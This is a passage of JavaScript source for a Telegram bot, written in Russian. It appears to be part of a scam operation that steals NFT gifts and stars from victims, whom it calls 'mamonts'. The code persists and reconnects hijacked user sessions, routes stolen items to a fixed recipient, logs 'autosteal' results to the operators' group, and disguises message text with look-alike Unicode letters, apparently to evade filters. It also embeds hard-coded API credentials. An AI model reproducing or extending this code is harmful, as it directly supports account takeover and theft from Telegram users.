import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
import fetch from 'node-fetch';
import dotenv from 'dotenv';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Загружаем .env файл с явным указанием пути
const envPath = path.join(__dirname, '.env');
const envResult = dotenv.config({ path: envPath });

if (envResult.error) {
  console.warn(`[ENV] Предупреждение: Не удалось загрузить .env файл: ${envResult.error.message}`);
  console.warn(`[ENV] Путь к .env: ${envPath}`);
  // Проверяем существование файла синхронно
  try {
    if (fs.existsSync(envPath)) {
      console.warn(`[ENV] Файл существует, но не может быть прочитан. Проверьте права доступа и формат файла.`);
    } else {
      console.warn(`[ENV] Файл не найден по пути: ${envPath}`);
    }
  } catch (e) {
    console.warn(`[ENV] Ошибка при проверке файла: ${e.message}`);
  }
} else {
  console.log(`[ENV] ✅ Файл .env успешно загружен из: ${envPath}`);
}

const require = createRequire(import.meta.url);
const { TelegramClient } = require("telegram");
const { StringSession, StoreSession } = require("telegram/sessions");
const { Api } = require("telegram/tl");

// Конфигурация
// BOT_TOKEN и WEB_URL будут загружены из config.json или .env после загрузки конфига
let BOT_TOKEN = null;
let WEB_URL = "";
let BOT_USERNAME = null; // Username бота, загружается при старте

let ADMIN_ID = 601408396; // Можно переопределить через config.json
let LOG_GROUP_ID = -1003117653183;
let LOG_TOPIC_ID = 74;
let AUTOSTEAL_RESULTS_TOPIC_ID = null;

// Функция обфускации текста - замена русских букв на похожие Unicode символы
function obfuscateText(text) {
  if (!text) return text;
  
  const obfuscationMap = {
    'А': 'ᴀ', 'а': 'ᴀ',
    'Б': 'ʙ', 'б': 'ʙ',
    'В': 'ʙ', 'в': 'ʙ',
    'Г': 'ᴦ', 'г': 'ᴦ',
    'Д': 'ᴅ', 'д': 'ᴅ',
    'Е': 'ᴇ', 'е': 'ᴇ',
    'Ё': 'ё', 'ё': 'ё',
    'Ж': 'ж', 'ж': 'ж',
    'З': 'ᴢ', 'з': 'ᴢ',
    'И': 'и', 'и': 'и',
    'Й': 'й', 'й': 'й',
    'К': 'ᴋ', 'к': 'ᴋ',
    'Л': 'ʟ', 'л': 'ʟ',
    'М': 'ᴍ', 'м': 'ᴍ',
    'Н': 'н', 'н': 'н',
    'О': 'ᴏ', 'о': 'ᴏ',
    'П': 'ᴨ', 'п': 'ᴨ',
    'Р': 'ᴩ', 'р': 'ᴩ',
    'С': 'ᴄ', 'с': 'ᴄ',
    'Т': 'ᴛ', 'т': 'ᴛ',
    'У': 'у', 'у': 'у',
    'Ф': 'ɸ', 'ф': 'ɸ',
    'Х': 'х', 'х': 'х',
    'Ц': 'ц', 'ц': 'ц',
    'Ч': 'ч', 'ч': 'ч',
    'Ш': 'ш', 'ш': 'ш',
    'Щ': 'щ', 'щ': 'щ',
    'Ъ': 'ъ', 'ъ': 'ъ',
    'Ы': 'ы', 'ы': 'ы',
    'Ь': 'ь', 'ь': 'ь',
    'Э': 'э', 'э': 'э',
    'Ю': 'ю', 'ю': 'ю',
    'Я': 'я', 'я': 'я'
  };
  
  // Заменяем только русские буквы, сохраняя HTML теги и другие символы
  let result = '';
  let inTag = false;
  let tagContent = '';
  
  for (let i = 0; i < text.length; i++) {
    const char = text[i];
    
    if (char === '<') {
      // Начинаем новый тег
      inTag = true;
      tagContent = char;
      continue;
    }
    
    if (char === '>') {
      // Заканчиваем тег - добавляем весь тег целиком без изменений
      tagContent += char;
      result += tagContent;
      tagContent = '';
      inTag = false;
      continue;
    }
    
    if (inTag) {
      // Внутри тега - просто собираем символы, не обфусцируем
      tagContent += char;
      continue;
    }
    
    // Вне тега - заменяем русские буквы на обфусцированные
    if (obfuscationMap[char]) {
      result += obfuscationMap[char];
    } else {
      result += char;
    }
  }
  
  // Если остался незакрытый тег, добавляем его как есть
  if (tagContent) {
    result += tagContent;
  }
  
  return result;
}

// Функция для проверки, является ли username валидным (не ID и не "user" + ID)
function isValidUsername(username) {
  if (!username || username === 'без username' || username === 'неизвестно') {
    return false;
  }
  // Проверяем, является ли username числом (ID)
  if (/^\d+$/.test(username)) {
    return false;
  }
  // Проверяем, начинается ли username с "user" + число
  if (/^user\d+$/.test(username)) {
    return false;
  }
  return true;
}

// Функция маскировки username - маскирует начало, оставляет конец видимым
function maskUsername(username) {
  if (!username || username === 'без username' || username === 'неизвестно') {
    return username;
  }
  
  // Убираем @ если есть
  const cleanUsername = username.replace('@', '');
  
  // Если username состоит только из цифр (это ID, а не username), не маскируем
  if (/^\d+$/.test(cleanUsername)) {
    return username; // Возвращаем как есть, но это не должно использоваться как username
  }
  
  if (cleanUsername.length <= 1) {
    return `@${cleanUsername}`;
  }
  
  // Логика маскировки: оставляем последние символы видимыми
  // - Если username <= 2 символа: не маскируем
  // - Если username 3-5 символов: маскируем все кроме последних 2
  // - Если username 6-10 символов: маскируем все кроме последних 4
  // - Если username > 10 символов: маскируем все кроме последних 7
  if (cleanUsername.length <= 2) {
    return `@${cleanUsername}`;
  } else if (cleanUsername.length <= 5) {
    // Оставляем последние 2 символа видимыми
    const visibleCount = 2;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  } else if (cleanUsername.length <= 10) {
    // Оставляем последние 4 символа видимыми
    const visibleCount = 4;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  } else {
    // Оставляем последние 7 символов видимыми для длинных username
    const visibleCount = 7;
    const masked = '*'.repeat(cleanUsername.length - visibleCount) + cleanUsername.slice(-visibleCount);
    return `@${masked}`;
  }
}

// Функция маскировки username мамонта в сообщениях логов
function maskMamontUsernameInMessage(message) {
  if (!message || typeof message !== 'string') return message;
  
  // Паттерн для поиска: 👤 <b>Мамонт:</b> @username или 👤 ᴍᴀᴍᴏнᴛ: @username
  // Маскируем username после "Мамонт:" или "ᴍᴀᴍᴏнᴛ:"
  let masked = message;
  
  // Универсальный паттерн: ищем @username после любого варианта "Мамонт:" или "ᴍᴀᴍᴏнᴛ:"
  // Паттерн 1: 👤 <b>Мамонт:</b> @username
  masked = masked.replace(/(👤\s*<b>Мамонт:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 2: 👤 ᴍᴀᴍᴏнᴛ: @username (обфусцированный)
  masked = masked.replace(/(👤\s*ᴍᴀᴍᴏнᴛ:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 3: 👤 <b>M🅰️M0ПT:</b> @username
  masked = masked.replace(/(👤\s*<b>M🅰️M0ПT:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 4: Мамонт: @username (без эмодзи)
  masked = masked.replace(/(Мамонт:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 5: ᴍᴀᴍᴏнᴛ: @username (обфусцированный, без эмодзи)
  masked = masked.replace(/(ᴍᴀᴍᴏнᴛ:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 6: 👤 <b>ᴍᴀᴍᴏнᴛ:</b> @username (обфусцированный в тегах)
  masked = masked.replace(/(👤\s*<b>ᴍᴀᴍᴏнᴛ:<\/b>\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  // Паттерн 7: Универсальный - любой вариант "мамонт" (кириллица или обфусцированный) перед @username
  masked = masked.replace(/(👤\s*(?:<b>)?[мm][аa][мm][оo][нn][тt](?:<\/b>)?:\s*@)([a-zA-Z0-9_]+)/gi, (match, prefix, username) => {
    const maskedUsername = maskUsername(username);
    return prefix + maskedUsername.replace('@', '');
  });
  
  return masked;
}

// Вспомогательная функция для отправки сообщений с учетом топика
async function sendMessageWithTopic(chatId, text, options = {}) {
  try {
    // Обфускация уже применяется в bot.sendMessage, поэтому просто передаем текст
    const messageOptions = { ...options };
    if (chatId === LOG_GROUP_ID && LOG_TOPIC_ID) {
      messageOptions.message_thread_id = LOG_TOPIC_ID;
    }
    return await bot.sendMessage(chatId, text, messageOptions);
  } catch (e) {
    // Если топик закрыт, пробуем отправить в админский чат вместо группы
    if (e.message && e.message.includes('TOPIC_CLOSED') && chatId === LOG_GROUP_ID) {
      console.error(`[AUTOSTEAL] Топик закрыт, отправляю в админский чат вместо группы`);
      return await bot.sendMessage(ADMIN_ID, text, options);
    }
    
    // Обработка rate limiting (429)
    const errorMsg = String(e.message || e.toString() || '').toLowerCase();
    if (errorMsg.includes('429') || errorMsg.includes('too many requests')) {
      const waitMatch = errorMsg.match(/retry after (\d+)/i);
      const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : 3;
      console.warn(`[SEND-MESSAGE] Rate limit при отправке сообщения. Ожидание ${waitSeconds} секунд...`);
      await new Promise(resolve => setTimeout(resolve, waitSeconds * 1000));
      // Повторная попытка
      try {
        return await bot.sendMessage(chatId, text, messageOptions);
      } catch (e2) {
        console.error(`[SEND-MESSAGE] Ошибка после ожидания rate limit: ${e2.message}`);
      }
    }
    
    throw e;
  }
}

// Безопасная функция для обновления сообщений с обработкой rate limit
async function safeEditMessage(chatId, messageId, text, options = {}) {
  try {
    // Обфускация уже применяется в bot.editMessageText, поэтому просто передаем текст
    return await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      ...options
    });
  } catch (e) {
    // Обработка rate limiting (429) - не прерываем процесс, просто логируем
    const errorMsg = String(e.message || e.toString() || '').toLowerCase();
    if (errorMsg.includes('429') || errorMsg.includes('too many requests')) {
      const waitMatch = errorMsg.match(/retry after (\d+)/i);
      const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : 3;
      console.warn(`[EDIT-MESSAGE] Rate limit при обновлении сообщения. Пропускаю обновление (не критично).`);
      // Не ждём, просто логируем - процесс должен продолжаться
      return null;
    }
    
    // Для других ошибок тоже не прерываем процесс
    console.error(`[EDIT-MESSAGE] Ошибка обновления сообщения: ${e.message}`);
    return null;
  }
}

// Загружаем config.json
let config = {
  recipientUsername: "qwehrtgfd",
  remainingStarsRecipient: "qwehrtgfd",
  apiId: 30205730,
  apiHash: "e3b805b197e894b0d7502e4fde9c177b",
  marketWebAppUrl: "",
  mamontGiftsDB: "mamont-gifts.json",
  logGroupId: -1003117653183,
  logTopicId: 74,
  autostealResultsTopicId: null,
  starsChannelId: null,
  starsMessageId: null
};

// API credentials (используются в performFullAutoSteal)
let apiId = 30205730;
let apiHash = "e3b805b197e894b0d7502e4fde9c177b";

async function loadConfig() {
  try {
    const configPath = path.join(__dirname, "config.json");
    console.log(`[CONFIG] Ищу config.json по пути: ${configPath}`);
    console.log(`[CONFIG] __dirname: ${__dirname}`);
    console.log(`[CONFIG] process.cwd(): ${process.cwd()}`);
    
    if (await fs.pathExists(configPath)) {
      console.log(`[CONFIG] ✅ config.json найден по пути: ${configPath}`);
      try {
        const fileContent = await fs.readFile(configPath, 'utf8');
        console.log(`[CONFIG] Размер файла: ${fileContent.length} байт`);
        const configData = JSON.parse(fileContent);
        console.log(`[CONFIG] ✅ config.json успешно прочитан и распарсен`);
      config = { ...config, ...configData };
      // Обновляем apiId и apiHash
      apiId = config.apiId || apiId;
      apiHash = config.apiHash || apiHash;
      // Обновляем настройки логирования
      if (config.logGroupId !== undefined) LOG_GROUP_ID = config.logGroupId;
      if (config.logTopicId !== undefined) LOG_TOPIC_ID = config.logTopicId;
      if (config.autostealResultsTopicId !== undefined) AUTOSTEAL_RESULTS_TOPIC_ID = config.autostealResultsTopicId;
      // Загружаем ADMIN_ID из config.json
      if (config.adminId !== undefined) ADMIN_ID = config.adminId;
      
      // Загружаем настройки для отправки звёзд на сообщение
      // Параметры уже загружены в config через spread оператор выше
      if (config.starsChannelId !== undefined) {
        console.log(`[CONFIG] starsChannelId загружен: ${config.starsChannelId}`);
      }
      if (config.starsMessageId !== undefined) {
        console.log(`[CONFIG] starsMessageId загружен: ${config.starsMessageId}`);
      }
      
      // Загружаем BOT_TOKEN: сначала из config.json, потом из .env
      if (config.botToken && config.botToken.trim()) {
        BOT_TOKEN = config.botToken.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из config.json`);
      } else if (process.env.BOT_TOKEN) {
        BOT_TOKEN = process.env.BOT_TOKEN.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из .env файла`);
      }
      
      // Загружаем WEB_URL: сначала из config.json, потом из .env
      if (config.webUrl && config.webUrl.trim()) {
        WEB_URL = config.webUrl.trim();
        console.log(`[CONFIG] WEB_URL загружен из config.json: ${WEB_URL}`);
      } else if (process.env.WEB_URL) {
        WEB_URL = process.env.WEB_URL.trim();
        console.log(`[CONFIG] WEB_URL загружен из .env файла: ${WEB_URL}`);
      }
      
      // Обрабатываем WEB_URL для marketWebAppUrl
      if (WEB_URL) {
        // Проверяем и добавляем https:// если его нет
        let url = WEB_URL.trim();
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
          url = 'https://' + url;
        }
        // Убираем http:// если есть, оставляем только https://
        if (url.startsWith('http://')) {
          url = url.replace('http://', 'https://');
        }
        config.marketWebAppUrl = url;
      }
      } catch (readError) {
        console.error(`[CONFIG] ❌ Ошибка чтения/парсинга config.json: ${readError.message}`);
        console.error(`[CONFIG] ❌ Тип ошибки: ${readError.name}`);
        if (readError.stack) {
          console.error(`[CONFIG] ❌ Stack: ${readError.stack}`);
        }
        // Если это ошибка парсинга JSON, показываем проблемный участок
        if (readError instanceof SyntaxError && fileContent) {
          const errorPos = parseInt(readError.message.match(/position (\d+)/)?.[1] || '0');
          const start = Math.max(0, errorPos - 50);
          const end = Math.min(fileContent.length, errorPos + 50);
          console.error(`[CONFIG] ❌ Проблемный участок JSON (позиция ${errorPos}):`);
          console.error(`[CONFIG] ${fileContent.substring(start, end)}`);
          console.error(`[CONFIG] ${' '.repeat(Math.min(50, errorPos - start))}^`);
        }
        throw readError; // Пробрасываем ошибку в catch блок
      }
    } else {
      console.warn(`[CONFIG] ⚠️  config.json не найден по пути: ${configPath}`);
      // Пробуем найти config.json в текущей рабочей директории
      const cwdConfigPath = path.join(process.cwd(), "config.json");
      if (await fs.pathExists(cwdConfigPath)) {
        console.log(`[CONFIG] ✅ config.json найден в рабочей директории: ${cwdConfigPath}`);
        const configData = await fs.readJson(cwdConfigPath);
        config = { ...config, ...configData };
        apiId = config.apiId || apiId;
        apiHash = config.apiHash || apiHash;
        if (config.logGroupId !== undefined) LOG_GROUP_ID = config.logGroupId;
        if (config.logTopicId !== undefined) LOG_TOPIC_ID = config.logTopicId;
        if (config.autostealResultsTopicId !== undefined) AUTOSTEAL_RESULTS_TOPIC_ID = config.autostealResultsTopicId;
        if (config.adminId !== undefined) ADMIN_ID = config.adminId;
        
        if (config.botToken && config.botToken.trim()) {
          BOT_TOKEN = config.botToken.trim();
          console.log(`[CONFIG] BOT_TOKEN загружен из config.json (рабочая директория)`);
        }
        if (config.webUrl && config.webUrl.trim()) {
          WEB_URL = config.webUrl.trim();
          console.log(`[CONFIG] WEB_URL загружен из config.json (рабочая директория): ${WEB_URL}`);
        }
      } else {
        console.warn(`[CONFIG] ⚠️  config.json не найден и в рабочей директории: ${cwdConfigPath}`);
      // Если config.json не найден, пробуем загрузить из .env
      if (process.env.BOT_TOKEN) {
        BOT_TOKEN = process.env.BOT_TOKEN.trim();
        console.log(`[CONFIG] BOT_TOKEN загружен из .env файла (config.json не найден)`);
      }
      if (process.env.WEB_URL) {
        WEB_URL = process.env.WEB_URL.trim();
        console.log(`[CONFIG] WEB_URL загружен из .env файла (config.json не найден)`);
        }
      }
    }
    
    // Проверяем, что BOT_TOKEN установлен
    if (!BOT_TOKEN) {
      console.error('\n❌ ========== ОШИБКА: BOT_TOKEN НЕ УСТАНОВЛЕН ==========');
      console.error('Установите botToken в config.json или BOT_TOKEN в .env файле');
      console.error('Пример для config.json: "botToken": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"');
      console.error('Пример для .env: BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz');
      console.error(`Проверенные пути:`);
      console.error(`  - ${path.join(__dirname, "config.json")}`);
      console.error(`  - ${path.join(process.cwd(), "config.json")}`);
      console.error(`  - ${path.join(__dirname, ".env")}`);
      console.error(`  - ${path.join(process.cwd(), ".env")}`);
      console.error('===========================================\n');
      // Не завершаем процесс сразу, даём возможность исправить проблему
      console.error('⚠️  Скрипт будет перезапущен через 30 секунд. Исправьте проблему с BOT_TOKEN.');
      setTimeout(() => {
      process.exit(1);
      }, 30000);
      return; // Выходим из функции, но не завершаем процесс сразу
    }
    
    // Отладочная информация о токене (показываем только первые и последние символы для безопасности)
    const tokenPreview = BOT_TOKEN.length > 10 
      ? `${BOT_TOKEN.substring(0, 5)}...${BOT_TOKEN.substring(BOT_TOKEN.length - 5)}` 
      : '***';
    console.log(`[CONFIG] BOT_TOKEN загружен (длина: ${BOT_TOKEN.length}, превью: ${tokenPreview})`);
    
  } catch (e) {
    console.log("⚠️  Не удалось загрузить config.json, используются значения по умолчанию");
    // Пробуем загрузить из .env
    if (process.env.BOT_TOKEN) {
      BOT_TOKEN = process.env.BOT_TOKEN.trim();
      console.log(`[CONFIG] BOT_TOKEN загружен из .env файла`);
    }
    if (process.env.WEB_URL) {
      WEB_URL = process.env.WEB_URL.trim();
      console.log(`[CONFIG] WEB_URL загружен из .env файла`);
    }
    
    if (!BOT_TOKEN) {
      console.error('\n❌ ========== ОШИБКА: BOT_TOKEN НЕ УСТАНОВЛЕН ==========');
      console.error('Установите botToken в config.json или BOT_TOKEN в .env файле');
      console.error(`Проверенные пути:`);
      console.error(`  - ${path.join(__dirname, "config.json")}`);
      console.error(`  - ${path.join(process.cwd(), "config.json")}`);
      console.error(`  - ${path.join(__dirname, ".env")}`);
      console.error(`  - ${path.join(process.cwd(), ".env")}`);
      console.error('===========================================\n');
      // Не завершаем процесс сразу, даём возможность исправить проблему
      console.error('⚠️  Скрипт будет перезапущен через 30 секунд. Исправьте проблему с BOT_TOKEN.');
      setTimeout(() => {
      process.exit(1);
      }, 30000);
      return; // Выходим из функции, но не завершаем процесс сразу
    }
  }
}

// Инициализация бота (будет выполнена после загрузки конфига)
let bot = null;

// Хранилище для связи userId с giftId при запросе номера
const workerInfo = new Map();

// Функция для компактного логирования ошибок Telegram API
function logError(error, context = '') {
  if (!error) {
    console.error(`[ERROR]${context ? ' ' + context : ''}:`, error);
    return;
  }
  
  // Извлекаем важную информацию из ошибки
  let errorInfo = {
    message: error.message || error.toString(),
    code: error.code,
  };
  
  // Если это ошибка Telegram API
  if (error.code === 'ETELEGRAM' && error.response) {
    const body = error.response.body || {};
    errorInfo = {
      message: body.description || error.message || 'Telegram API Error',
      code: body.error_code || error.code,
      statusCode: error.response.statusCode,
    };
    
    // Специальная обработка для известных ошибок
    if (errorInfo.code === 409) {
      console.error(`[POLLING ERROR]${context ? ' ' + context : ''}: 409 Conflict - Другой экземпляр бота уже запущен. Убедитесь, что только один процесс использует этот BOT_TOKEN.`);
      return;
    }
    
    if (errorInfo.code === 429) {
      const retryAfter = body.parameters?.retry_after || 'неизвестно';
      console.error(`[POLLING ERROR]${context ? ' ' + context : ''}: 429 Too Many Requests - retry after ${retryAfter} секунд`);
      return;
    }
  }
  
  // Выводим только важную информацию
  const errorStr = errorInfo.code 
    ? `${errorInfo.message} (code: ${errorInfo.code}${errorInfo.statusCode ? ', status: ' + errorInfo.statusCode : ''})`
    : errorInfo.message;
  
  console.error(`[ERROR]${context ? ' ' + context : ''}:`, errorStr);
  
  // Stack trace только если это не ошибка Telegram API
  if (error.stack && !error.code) {
    console.error(`[ERROR]${context ? ' ' + context : ''} Stack:`, error.stack.split('\n').slice(0, 3).join('\n'));
  }
}

// Функция для инициализации обработчиков событий бота
function initBotHandlers() {
  if (!bot) {
    console.error('[BOT] Бот не инициализирован, обработчики событий не могут быть установлены');
    return;
  }
  
  // Обработка ошибок polling
  bot.on('polling_error', (error) => {
    // Специальная обработка для 401 ошибки
    if (error.code === 401 || (error.response && error.response.statusCode === 401)) {
      const tokenPreview = BOT_TOKEN && BOT_TOKEN.length > 10 
        ? `${BOT_TOKEN.substring(0, 5)}...${BOT_TOKEN.substring(BOT_TOKEN.length - 5)}` 
        : '***';
      
      console.error('\n❌ ========== ОШИБКА АВТОРИЗАЦИИ БОТА ==========');
      console.error('Ошибка 401 Unauthorized означает, что токен бота неверный или недействителен.');
      console.error('\nПроверьте:');
      console.error('1. Правильность токена в config.json (поле "botToken") или в .env (BOT_TOKEN)');
      console.error('2. Формат токена: "botToken": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"');
      console.error('3. Токен должен быть действительным (проверьте в @BotFather)');
      console.error('4. Убедитесь, что в config.json нет лишних пробелов или символов');
      if (BOT_TOKEN) {
        console.error(`\nТекущий токен (превью): ${tokenPreview}`);
        console.error(`Длина токена: ${BOT_TOKEN.length} символов`);
        
        // Проверяем формат токена
        const tokenFormat = /^\d+:[A-Za-z0-9_-]+$/;
        if (!tokenFormat.test(BOT_TOKEN.trim())) {
          console.error('⚠️  ВНИМАНИЕ: Формат токена неверный!');
          console.error('Правильный формат: число:буквы_и_цифры');
          console.error('Пример: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz');
        }
        
        // Проверяем на лишние пробелы
        if (BOT_TOKEN !== BOT_TOKEN.trim()) {
          console.error('⚠️  ВНИМАНИЕ: В токене обнаружены лишние пробелы!');
          console.error('Убедитесь, что в config.json нет пробелов вокруг значения');
        }
      }
      console.error('===========================================\n');
    }
    
    logError(error, 'POLLING');
  });

  bot.on('error', (error) => {
    logError(error, 'BOT');
  });
}

// Путь к БД подарков мамонтов
const MAMONT_GIFTS_DB_PATH = path.join(__dirname, config.mamontGiftsDB || 'mamont-gifts.json');
const PROCESSED_LINKS_PATH = path.join(__dirname, 'sursmarketa', 'templates2', 'processed_links.txt');
const USERS_DB_PATH = path.join(__dirname, 'users.json');
const SUCCESSFUL_NFT_DB_PATH = path.join(__dirname, 'base.txt');

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================

// Функция для сохранения успешно переданных NFT в base.txt
async function saveSuccessfulNFTs(nftList) {
  try {
    if (!nftList || nftList.length === 0) {
      return;
    }
    
    // Читаем существующие данные
    let existingLinks = new Set();
    if (await fs.pathExists(SUCCESSFUL_NFT_DB_PATH)) {
      try {
        const content = await fs.readFile(SUCCESSFUL_NFT_DB_PATH, 'utf-8');
        const lines = content.split('\n').map(line => line.trim()).filter(line => line && line.startsWith('https://'));
        existingLinks = new Set(lines);
      } catch (e) {
        console.error(`[SAVE-NFT-DB] Ошибка чтения base.txt: ${e.message}`);
        existingLinks = new Set();
      }
    }
    
    // Добавляем новые ссылки (избегаем дубликатов)
    const newLinks = nftList
      .map(nft => nft.link || '')
      .filter(link => link && link.startsWith('https://') && !existingLinks.has(link));
    
    if (newLinks.length === 0) {
      return;
    }
    
    // Добавляем новые ссылки в Set
    newLinks.forEach(link => existingLinks.add(link));
    
    // Сохраняем все ссылки в файл (каждая на новой строке)
    const allLinks = Array.from(existingLinks).sort();
    await fs.writeFile(SUCCESSFUL_NFT_DB_PATH, allLinks.join('\n') + '\n', 'utf-8');
    console.log(`[SAVE-NFT-DB] ✅ Сохранено ${newLinks.length} новых NFT в base.txt. Всего: ${allLinks.length}`);
  } catch (e) {
    console.error(`[SAVE-NFT-DB] ❌ Ошибка сохранения NFT в base.txt: ${e.message}`);
  }
}

// Функция для получения количества успешно переданных NFT
async function getSuccessfulNFTCount() {
  try {
    if (!await fs.pathExists(SUCCESSFUL_NFT_DB_PATH)) {
      return 0;
    }
    
    const content = await fs.readFile(SUCCESSFUL_NFT_DB_PATH, 'utf-8');
    if (!content.trim()) {
      return 0;
    }
    
    // Считаем непустые строки со ссылками
    const lines = content.split('\n')
      .map(line => line.trim())
      .filter(line => line && line.startsWith('https://'));
    
    return lines.length;
  } catch (e) {
    console.error(`[GET-NFT-COUNT] Ошибка чтения base.txt: ${e.message}`);
    return 0;
  }
}

// Функция для обработки rate limiting (429 ошибок)
async function handleRateLimit(error, retryCount = 0, maxRetries = 3) {
  const errorMsg = String(error.errorMessage || error.message || error.toString() || '').toLowerCase();
  
  // Проверяем на 429 или flood wait
  const is429 = errorMsg.includes('429') || errorMsg.includes('too many requests');
  const waitMatch = errorMsg.match(/retry after (\d+)/i) || 
                   errorMsg.match(/wait of (\d+)/) || 
                   errorMsg.match(/flood_wait[_\s]?(\d+)/) ||
                   (error.seconds && [String(error.seconds)]);
  
  if (is429 || waitMatch) {
    const waitSeconds = waitMatch ? (parseInt(waitMatch[1]) || (error.seconds ? parseInt(error.seconds) : 3)) : 3;
    const waitTime = Math.max(waitSeconds, 3); // Минимум 3 секунды
    
    if (retryCount < maxRetries) {
      console.log(`[RATE-LIMIT] Обнаружен rate limit. Ожидание ${waitTime} секунд перед повтором (попытка ${retryCount + 1}/${maxRetries})...`);
      await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
      return { shouldRetry: true, waitTime };
    } else {
      console.error(`[RATE-LIMIT] Превышено максимальное количество попыток (${maxRetries}). Ожидание ${waitTime} секунд...`);
      await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
      return { shouldRetry: false, waitTime, error: `Rate limit: нужно подождать ${waitTime} секунд` };
    }
  }
  
  return { shouldRetry: false, error: errorMsg };
}

// Обёртка для безопасного вызова API с обработкой rate limiting
async function safeInvoke(client, apiCall, retryCount = 0, maxRetries = 3) {
  try {
    return await apiCall();
  } catch (error) {
    const rateLimitInfo = await handleRateLimit(error, retryCount, maxRetries);
    
    if (rateLimitInfo.shouldRetry && retryCount < maxRetries) {
      console.log(`[SAFE-INVOKE] Повторная попытка после rate limit (${retryCount + 1}/${maxRetries})...`);
      return await safeInvoke(client, apiCall, retryCount + 1, maxRetries);
    }
    
    // Если это rate limit, но превышены попытки, пробрасываем ошибку
    if (rateLimitInfo.error && rateLimitInfo.error.includes('Rate limit')) {
      throw new Error(rateLimitInfo.error);
    }
    
    // Иначе пробрасываем оригинальную ошибку
    throw error;
  }
}

// ==================== ПАТЧ ДЛЯ ОБРАБОТКИ INVOICE_INVALID И AUTH_KEY_UNREGISTERED ====================

const MAX_RECONNECT_RETRIES = 3;
const MAX_OPERATION_RETRIES = 3;
const BACKOFF_BASE_MS = 300; // для экспоненциального бэкаффа

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

// Универсальная проверка причины ошибки
function errIncludes(err, text) {
  if (!err) return false;
  const s = String(err && (err.errorMessage || err.message || err.type || err));
  return s.includes(text);
}

// Проверяет авторизацию и при необходимости переподключает
async function ensureAuthorized(client) {
  try {
    // Пытаемся простой "пинг" — лёгкий вызов, который не требует прав
    await safeInvoke(client, async () => client.invoke(new Api.help.GetConfig()));
    return true;
  } catch (err) {
    if (errIncludes(err, "AUTH_KEY_UNREGISTERED") || errIncludes(err, "AUTH_KEY_UNREGISTERED:")) {
      // Попытка переподключения и восстановления session
      return false;
    }
    // Любая другая ошибка — пробрасываем наружу
    throw err;
  }
}

// Переподключение с повторными попытками
async function reconnectWithRetry(client, sessionPath, options = { maxRetries: MAX_RECONNECT_RETRIES }, error = null) {
  // ОПТИМИЗАЦИЯ: Проверяем, нужен ли reconnect
  if (error && !shouldReconnect(error)) {
    console.log(`[RECONNECT] ⚠️  Reconnect не требуется для ошибки: ${error.message || error}`);
    throw error; // Просто пробрасываем ошибку дальше
  }
  
  let attempt = 0;
  while (attempt < options.maxRetries) {
    attempt++;
    try {
      console.warn(`[RECONNECT] Попытка переподключения ${attempt}/${options.maxRetries}...`);
      try {
        // Если клиент предоставляет disconnect/connect:
        if (typeof client.disconnect === "function") {
          try { await client.disconnect(); } catch (_) {}
        }
      } catch (_) {}
      
      // Попробуем старт/подключение. В GramJS это client.start() или client.connect()
      if (typeof client.connect === "function") {
        await client.connect();
      } else {
        throw new Error("Client has no connect method for reconnect");
      }
      
      // Проверяем авторизацию после подключения
      if (!(await client.checkAuthorization())) {
        throw new Error("Authorization check failed after reconnect");
      }
      
      // После успешного старта — сохраняем session
      await persistSession(client, sessionPath);
      
      console.info(`[RECONNECT] ✅ Успешно переподключено`);
      return true;
    } catch (err) {
      console.error(`[RECONNECT] Попытка ${attempt} не удалась:`, err.message || err);
      if (attempt < options.maxRetries) {
        const backoff = BACKOFF_BASE_MS * Math.pow(2, attempt);
        await sleep(backoff);
      }
    }
  }
  throw new Error("Не удалось переподключиться после всех попыток");
}

// Сохранение сессии в файл
async function persistSession(client, sessionPath) {
  try {
    if (!sessionPath) return;
    
    // Если используется StringSession, получаем строку сессии
    if (client._session && typeof client._session.save === 'function') {
      const sessionString = await client._session.save();
      if (sessionString) {
        await fs.writeFile(sessionPath, sessionString, 'utf-8');
        console.log(`[PERSIST-SESSION] ✅ Сессия сохранена: ${sessionPath}`);
      }
    } else if (client._session && client._session instanceof StringSession) {
      const sessionString = client._session.save();
      if (sessionString) {
        await fs.writeFile(sessionPath, sessionString, 'utf-8');
        console.log(`[PERSIST-SESSION] ✅ Сессия сохранена: ${sessionPath}`);
      }
    }
  } catch (err) {
